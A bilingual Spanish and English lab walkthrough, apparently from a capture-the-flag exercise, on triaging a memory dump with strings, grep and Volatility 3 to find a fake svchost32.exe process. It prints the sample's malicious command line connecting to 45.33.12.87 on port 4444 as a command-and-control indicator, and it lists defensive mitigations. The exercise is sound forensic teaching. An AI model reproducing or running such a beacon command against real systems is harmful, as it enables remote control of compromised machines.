Objetivo

Nota sobre esta muestra de memoria

Un volcado de memoria real (compatible con los perfiles de sistema operativo que usa Volatility para reconstruir pslist/pstree con toda su estructura de kernel) pesa varios GB y no es viable de distribuir en este laboratorio. Esta muestra es un extracto reducido, pensado para practicar la técnica que de verdad importa en un triage rápido: localizar cadenas de texto reveladoras con strings/grep — el primer paso que cualquier analista da incluso antes de cargar Volatility. Los comandos de Volatility se documentan abajo como referencia de cómo abordarías un volcado real.

Inicio rápido

strings memdump_workstation01.raw | grep "PROC_ENTRY"

1 · Por qué funciona

La memoria RAM de un proceso en ejecución contiene, en texto plano, buena parte de la información que ese proceso maneja: rutas de ficheros, argumentos de línea de comandos, cadenas de configuración… Un volcado de memoria congela ese estado, y aunque no tengas un framework completo de análisis, strings por sí solo ya revela muchísimo.

2 · Triage rápido con strings

strings memdump_workstation01.raw | grep "PROC_ENTRY"

Verás una lista de procesos "en memoria": csrss.exe, explorer.exe, chrome.exe, OUTLOOK.EXE, Teams.exe, OneDrive.exe… y uno que no encaja.

3 · Identificar el proceso anómalo

strings memdump_workstation01.raw | grep -A1 "svchost32"
# PROC_ENTRY|PID:4821|PPID:668|IMAGE:svchost32.exe|PATH:C:\Users\Public\svchost32.exe|CMD:svchost32.exe -connect 45.33.12.87:4444 -k

Dos señales inequívocas de proceso malicioso:

  • Ruta anómala: se ejecuta desde C:\Users\Public\, no desde System32 como el svchost.exe legítimo.
  • Línea de comandos sospechosa: conecta a una IP externa por un puerto no estándar (-connect 45.33.12.87:4444) — patrón típico de una conexión C2.

4 · (Referencia) Cómo lo harías con un volcado real

# Identificar el perfil de SO
volatility3 -f memdump.raw windows.info

# Listar procesos (detecta también procesos ocultos/desenlazados)
volatility3 -f memdump.raw windows.pslist
volatility3 -f memdump.raw windows.pstree

# Ver la línea de comandos de un PID sospechoso
volatility3 -f memdump.raw windows.cmdline --pid 4821

5 · Capturar la flag

strings memdump_workstation01.raw | grep -A1 "svchost32"
HL{···}

Mitigación

  • EDR con detección de procesos ejecutándose desde rutas de usuario no habituales (%PUBLIC%, %TEMP%, %APPDATA%).
  • Bloquear conexiones salientes a puertos no estándar desde procesos que normalmente no las hacen (Sysmon Event ID 3 + reglas de red).
  • Allowlisting de aplicaciones (AppLocker/WDAC) para impedir la ejecución de binarios no autorizados, con independencia del nombre que usen.

Herramientas

strings grep Volatility 3 Rekall

1 · Why it works

A running process's RAM holds, in plain text, much of the information it handles: file paths, command-line arguments, configuration strings… A memory dump freezes that state, and even without a full analysis framework, strings alone already reveals a lot.

2 · Quick triage with strings

strings memdump_workstation01.raw | grep "PROC_ENTRY"

You'll see a list of processes "in memory": csrss.exe, explorer.exe, chrome.exe, OUTLOOK.EXE, Teams.exe, OneDrive.exe… and one that doesn't fit.

3 · Identify the anomalous process

strings memdump_workstation01.raw | grep -A1 "svchost32"
# PROC_ENTRY|PID:4821|PPID:668|IMAGE:svchost32.exe|PATH:C:\Users\Public\svchost32.exe|CMD:svchost32.exe -connect 45.33.12.87:4444 -k

Two unmistakable signs of a malicious process:

  • Anomalous path: it runs from C:\Users\Public\, not from System32 like the legitimate svchost.exe.
  • Suspicious command line: it connects to an external IP on a non-standard port (-connect 45.33.12.87:4444) — a typical C2 connection pattern.

4 · (Reference) How you'd approach a real dump

# Identify the OS profile
volatility3 -f memdump.raw windows.info

# List processes (also detects hidden/unlinked processes)
volatility3 -f memdump.raw windows.pslist
volatility3 -f memdump.raw windows.pstree

# View the command line of a suspicious PID
volatility3 -f memdump.raw windows.cmdline --pid 4821

5 · Capture the flag

strings memdump_workstation01.raw | grep -A1 "svchost32"
HL{···}

Mitigation

  • EDR detecting processes running from unusual user paths (%PUBLIC%, %TEMP%, %APPDATA%).
  • Block outbound connections to non-standard ports from processes that normally don't make them (Sysmon Event ID 3 + network rules).
  • Application allowlisting (AppLocker/WDAC) to prevent unauthorized binaries from running, regardless of the name they use.

Tools

strings grep Volatility 3 Rekall
